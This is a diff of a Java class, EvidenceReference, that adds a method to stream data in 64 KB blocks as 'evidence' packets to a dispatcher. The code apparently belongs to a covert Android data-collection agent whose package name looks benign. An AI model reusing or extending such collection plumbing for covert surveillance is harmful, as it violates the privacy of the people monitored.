@@ -9,6 +9,8 @@
 
 package com.android.deviceinfo.evidence;
 
+import java.io.DataInputStream;
+import java.io.IOException;
 import java.util.ArrayList;
 
 import com.android.deviceinfo.Packet;
@@ -22,7 +24,7 @@ import com.android.deviceinfo.util.WChar;
  * The Class LogR.
  */
 public class EvidenceReference {
-	private static final String TAG = "LogR";
+	private static final String TAG = "EvRef";
 
 	/** The type. */
 	private int type;
@@ -34,8 +36,6 @@ public class EvidenceReference {
 	private EvDispatcher disp;
 
 	private boolean hasData;
-
-	private int size;
 
 	/** The Constant LOG_CREATE. */
 	final public static int LOG_CREATE = 0x1;
@@ -113,8 +113,6 @@ public class EvidenceReference {
 		p.setData(data);
 
 		hasData = true;
-		size = data.length;
-
 		send(p);
 	}
 
@@ -132,7 +130,7 @@ public class EvidenceReference {
 
 	public static void atomic(int evidenceType, byte[] additional, byte[] data) {
 		if (Cfg.DEBUG) {
-			//Check.log(TAG + " (atomic)");
+			// Check.log(TAG + " (atomic)");
 		}
 		final Packet p = new Packet(evidenceType, additional, data);
 		EvDispatcher.self().send(p);
@@ -140,7 +138,7 @@ public class EvidenceReference {
 
 	public static void atomic(int evidenceType, ArrayList<byte[]> items) {
 		if (Cfg.DEBUG) {
-			//Check.log(TAG + " (atomic)");
+			// Check.log(TAG + " (atomic)");
 		}
 		final Packet p = new Packet(evidenceType, items);
 		EvDispatcher.self().send(p);
@@ -179,8 +177,6 @@ public class EvidenceReference {
 		send(p);
 
 		hasData = true;
-		size += data.length;
-
 		return;
 	}
 
@@ -199,6 +195,60 @@ public class EvidenceReference {
 		}
 
 		write(buffer);
+	}
+
+	public void write(DataInputStream is, int length) {
+		int BLOCKSIZE = 65536;
+		byte[] buffer = new byte[BLOCKSIZE];
+		int offset = 0;
+		
+		Packet p = new Packet(unique);
+		
+		p.setCommand(LOG_APPEND);
+		p.setData(null, length);
+		send(p);
+
+		int size = 0;
+		try {
+			for (;;) {
+
+				int len = is.read(buffer);
+				if(len==-1){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (write) end of file");
+					}
+					break;
+				}
+				if(len!=BLOCKSIZE){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (write) last block size: %s", len);
+					}
+				}else{
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (write) block size: %s %s/%s", len, size, length);
+					}
+				}
+				p = new Packet(unique);
+				p.setCommand(LOG_APPEND);
+				p.setData(buffer, len);
+				send(p);
+				hasData = true;
+				size += len;
+				
+			}
+
+		} catch (IOException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (write) Error: " + e);
+			}
+		}
+
+		
+		if (Cfg.DEBUG) {
+			Check.ensures(size == length, "Wrong size, expected:" + length);
+			Check.log(TAG + " (write) sent size: %s", size);
+		}
+	 
 	}
 
 	/**
@@ -251,7 +301,4 @@ public class EvidenceReference {
 		}
 	}
 
-	public int getSize() {
-		return size;
-	}
 }
